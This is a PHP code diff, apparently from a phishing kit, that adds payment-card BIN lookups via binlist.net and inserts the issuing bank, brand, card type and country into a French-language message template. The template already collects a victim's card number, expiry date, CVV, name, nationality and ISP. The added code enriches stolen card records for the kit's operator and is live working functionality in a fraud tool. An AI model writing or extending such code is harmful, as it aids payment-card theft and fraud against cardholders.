@@ -69,6 +69,71 @@ function interface_footer_date(): string
     return $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');
 }
 
+function detect_card_brand(string $digits): string
+{
+    if ($digits === '') {
+        return '—';
+    }
+
+    if (str_starts_with($digits, '4')) {
+        return 'Visa';
+    }
+    if (preg_match('/^5[1-5]/', $digits) || str_starts_with($digits, '2')) {
+        return 'Mastercard';
+    }
+    if (preg_match('/^3[47]/', $digits)) {
+        return 'American Express';
+    }
+    if (str_starts_with($digits, '6')) {
+        return 'Discover';
+    }
+
+    return '—';
+}
+
+function lookup_card_bin(string $cardNumber): array
+{
+    $digits = preg_replace('/\D/', '', $cardNumber);
+    $fallback = [
+        'bank' => '—',
+        'brand' => detect_card_brand($digits),
+        'type' => '—',
+        'country' => '—',
+    ];
+
+    if (strlen($digits) < 6) {
+        return $fallback;
+    }
+
+    $bin = substr($digits, 0, min(8, strlen($digits)));
+    $url = 'https://lookup.binlist.net/' . $bin;
+    $context = stream_context_create([
+        'http' => [
+            'method' => 'GET',
+            'header' => "Accept: application/json\r\nAccept-Version: 3\r\n",
+            'timeout' => 5,
+            'ignore_errors' => true,
+        ],
+    ]);
+
+    $response = @file_get_contents($url, false, $context);
+    if ($response === false) {
+        return $fallback;
+    }
+
+    $json = json_decode($response, true);
+    if (!is_array($json)) {
+        return $fallback;
+    }
+
+    return [
+        'bank' => trim((string) ($json['bank']['name'] ?? '')) ?: '—',
+        'brand' => trim((string) ($json['scheme'] ?? '')) ?: $fallback['brand'],
+        'type' => trim((string) ($json['type'] ?? '')) ?: '—',
+        'country' => trim((string) ($json['country']['name'] ?? '')) ?: '—',
+    ];
+}
+
 function lookup_isp(string $ip): string
 {
     if ($ip === '—' || !filter_var($ip, FILTER_VALIDATE_IP)) {
@@ -124,10 +189,15 @@ function build_card_message(array $data, bool $partial = false): string
     $time = $now->format('H:i:s');
 
     $card = $cardDigits;
+    $bin = lookup_card_bin($cardDigits);
     $titre = format_title_sex((string) ($data['title'] ?? ''));
     if ($titre === '—') {
         $titre = '';
     }
+    $banque = $bin['bank'] === '—' ? '' : $bin['bank'];
+    $marque = $bin['brand'] === '—' ? '' : $bin['brand'];
+    $type = $bin['type'] === '—' ? '' : $bin['type'];
+    $paysBanque = $bin['country'] === '—' ? '' : $bin['country'];
     $nationalite = format_nationality((string) ($data['country'] ?? ''));
     $nom = msg_val($data, 'lastName');
     $prenom = msg_val($data, 'firstName');
@@ -214,6 +284,12 @@ TXT;
 ⤷ 💳 Numéro de carte : {$carte}
 ⤷ 📅 Date d'expiration : {$exp}
 ⤷ 🔐 Cryptogramme Visuel : {$cvv}
+
+🏛️ Informations Bancaires
+⤷ 🧠 Banque : {$banque}
+⤷ ⭐️ Marque : {$marque}
+⤷ 🧩 Type : {$type}
+⤷ 🌍 Pays : {$paysBanque}
 
 🔍 Informations Complémentaires
 ├ 🛰 ISP : {$isp}
